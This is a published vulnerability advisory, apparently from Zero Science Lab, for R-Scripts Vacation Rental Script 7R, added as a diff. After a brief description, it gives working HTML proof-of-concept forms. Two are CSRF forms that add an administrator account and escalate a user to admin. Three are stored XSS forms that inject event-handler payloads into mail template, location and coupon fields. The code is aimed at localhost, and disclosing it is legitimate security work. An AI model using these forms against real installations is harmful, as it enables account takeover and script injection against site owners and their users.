@@ -1,0 +1,189 @@
+﻿
+R-Scripts VRS 7R Multiple Stored XSS And CSRF Vulnerabilities
+
+
+Vendor: R-Scripts
+Product web page: http://www.r-scripts.com
+Affected version: 7R
+
+Summary: PHP Vacation Rental Script is the best solution
+for your vacation rentals online business.
+
+Desc: The application allows users to perform certain actions
+via HTTP requests without performing any validity checks
+to verify the requests. This can be exploited to perform
+certain actions with administrative privileges if a logged-in
+user visits a malicious web site. Stored cross-site scripting
+vulnerabilitity was also discovered. The issue is triggered
+when input passed via multiple POST parameters is not properly
+sanitized before being returned to the user. This can be
+exploited to execute arbitrary HTML and script code in a
+user's browser session in context of an affected site.
+
+Tested on: Apache/2.2.29
+           PHP/5.3.29
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5274
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5274.php
+
+
+01.10.2015
+
+--
+
+
+CSRF Add Admin:
+---------------
+
+<html>
+  <body>
+    <form action="http://127.0.0.1/admin/users/add" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="role" value="admin" />
+      <input type="hidden" name="username" value="Testingus" />
+      <input type="hidden" name="password" value="123123" />
+      <input type="hidden" name="retype&#95;password" value="123123" />
+      <input type="hidden" name="generate&#95;password&#95;label" value="&#32;Generate&#32;password" />
+      <input type="hidden" name="name" value="Test" />
+      <input type="hidden" name="email" value="test&#64;test&#46;tld" />
+      <input type="hidden" name="phone" value="111111111" />
+      <input type="hidden" name="phone2" value="&#13;" />
+      <input type="hidden" name="sms&#95;phone" value="&#13;" />
+      <input type="hidden" name="sms&#95;active" value="0" />
+      <input type="hidden" name="fax" value="&#13;" />
+      <input type="hidden" name="country" value="Uganda" />
+      <input type="hidden" name="location" value="N" />
+      <input type="hidden" name="address" value="Address" />
+      <input type="hidden" name="zip" value="&#13;" />
+      <input type="hidden" name="active&#95;newsletter" value="0" />
+      <input type="hidden" name="active" value="1" />
+      <input type="hidden" name="banned" value="0" />
+      <input type="hidden" name="ban&#95;reason" value="&#13;" />
+      <input type="hidden" name="verified&#95;user" value="1" />
+      <input type="hidden" name="paypal&#95;email" value="&#13;" />
+      <input type="hidden" name="submitf" value="submit" />
+      <input type="submit" value="CSRF Add Admin" />
+    </form>
+  </body>
+</html>
+
+
+Privilege Escalation:
+---------------------
+
+<html>
+  <body>
+    <form action="http://127.0.0.1/admin/users/edit/4" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="role" value="admin" />
+      <input type="hidden" name="username" value="member" />
+      <input type="hidden" name="password" value="&#13;" />
+      <input type="hidden" name="retype&#95;password" value="&#13;" />
+      <input type="hidden" name="generate&#95;password&#95;label" value="&#32;Generate&#32;password" />
+      <input type="hidden" name="name" value="Member" />
+      <input type="hidden" name="email" value="vrs&#95;owner&#64;vacationrentalscript&#46;com" />
+      <input type="hidden" name="phone" value="&#13;" />
+      <input type="hidden" name="phone2" value="&#13;" />
+      <input type="hidden" name="sms&#95;phone" value="&#13;" />
+      <input type="hidden" name="sms&#95;active" value="0" />
+      <input type="hidden" name="fax" value="&#13;" />
+      <input type="hidden" name="country" value="Germany" />
+      <input type="hidden" name="location" value="test" />
+      <input type="hidden" name="address" value="test&#32;address" />
+      <input type="hidden" name="zip" value="&#13;" />
+      <input type="hidden" name="active&#95;newsletter" value="1" />
+      <input type="hidden" name="active" value="1" />
+      <input type="hidden" name="banned" value="0" />
+      <input type="hidden" name="ban&#95;reason" value="&#13;" />
+      <input type="hidden" name="verified&#95;user" value="1" />
+      <input type="hidden" name="paypal&#95;email" value="sandbox&#95;owner2&#64;vacationrentalscript&#46;com" />
+      <input type="hidden" name="submitf" value="submit&#95;view" />
+      <input type="submit" value="Escalate" />
+    </form>
+  </body>
+</html>
+
+
+Stored XSS:
+-----------
+
+<html>
+  <body>
+    <form action="http://127.0.0.1/admin/mail_templates/add" method="POST">
+      <input type="hidden" name="alias" value='" onmousemove=confirm(1) >' />
+      <input type="hidden" name="sender&#95;name" value='" onmousemove=confirm(2) >' />
+      <input type="hidden" name="sender&#95;email" value='" onmousemove=confirm(3) >' />
+      <input type="hidden" name="bcc&#95;copy" value='" onmousemove=confirm(4) >' />
+      <input type="hidden" name="subject&#95;1" value='" onmousemove=confirm(5) >' />
+      <input type="hidden" name="subject&#95;2" value="&#13;" />
+      <input type="hidden" name="subject&#95;3" value="&#13;" />
+      <input type="hidden" name="subject&#95;4" value="&#13;" />
+      <input type="hidden" name="subject&#95;5" value="&#13;" />
+      <input type="hidden" name="body&#95;1" value="test" />
+      <input type="hidden" name="body&#95;2" value="&#13;" />
+      <input type="hidden" name="body&#95;3" value="&#13;" />
+      <input type="hidden" name="body&#95;4" value="&#13;" />
+      <input type="hidden" name="body&#95;5" value="&#13;" />
+      <input type="hidden" name="active" value="1" />
+      <input type="hidden" name="is&#95;bulk&#95;mail" value="0" />
+      <input type="hidden" name="submitf" value="submit&#95;view" />
+      <input type="submit" value="XSS Add Mail" />
+    </form>
+  </body>
+</html>
+
+
+Stored XSS:
+-----------
+
+<html>
+  <body>
+    <form action="http://127.0.0.1/admin/locations/add" method="POST">
+      <input type="hidden" name="location&#95;selected&#95;id" value="0" />
+      <input type="hidden" name="temp&#95;lat" value="0" />
+      <input type="hidden" name="temp&#95;lng" value="0" />
+      <input type="hidden" name="title&#95;1" value='" onmousemove=confirm(1) >' />
+      <input type="hidden" name="title&#95;2" value="&#13;" />
+      <input type="hidden" name="title&#95;3" value="&#13;" />
+      <input type="hidden" name="title&#95;4" value="&#13;" />
+      <input type="hidden" name="title&#95;5" value="&#13;" />
+      <input type="hidden" name="location&#95;parent&#95;id" value="&#45;1" />
+      <input type="hidden" name="slug&#95;1" value="&#13;" />
+      <input type="hidden" name="slug&#95;2" value="&#13;" />
+      <input type="hidden" name="slug&#95;3" value="&#13;" />
+      <input type="hidden" name="slug&#95;4" value="&#13;" />
+      <input type="hidden" name="slug&#95;5" value="&#13;" />
+      <input type="hidden" name="lat" value='" onmousemove=confirm(2) >' />
+      <input type="hidden" name="lng" value='" onmousemove=confirm(3) >' />
+      <input type="hidden" name="zip&#95;code" value="&#13;" />
+      <input type="hidden" name="active" value="1" />
+      <input type="hidden" name="submitf" value="submit" />
+      <input type="submit" value="XSS Add Location" />
+    </form>
+  </body>
+</html>
+
+Stored XSS:
+-----------
+
+<html>
+  <body>
+    <form action="http://127.0.0.1/admin/coupons/add" method="POST">
+      <input type="hidden" name="start&#95;date" value="&#13;" />
+      <input type="hidden" name="start&#95;date&#95;picker" value="&#13;" />
+      <input type="hidden" name="end&#95;date" value="2015&#45;11&#45;12" />
+      <input type="hidden" name="end&#95;date&#95;picker" value='" onmousemove=confirm(1) >' />
+      <input type="hidden" name="title" value='" onmousemove=confirm(2) >' />
+      <input type="hidden" name="hash" value="RG8AVL" />
+      <input type="hidden" name="coupon&#95;code" value='" onmousemove=confirm(3) >' />
+      <input type="hidden" name="discount" value='" onmousemove=confirm(4) >' />
+      <input type="hidden" name="utimes" value='" onmousemove=confirm(5) >' />
+      <input type="hidden" name="active" value="1" />
+      <input type="hidden" name="submitf" value="submit&#95;view" />
+      <input type="submit" value="XSS Add Coupons" />
+    </form>
+  </body>
+</html>
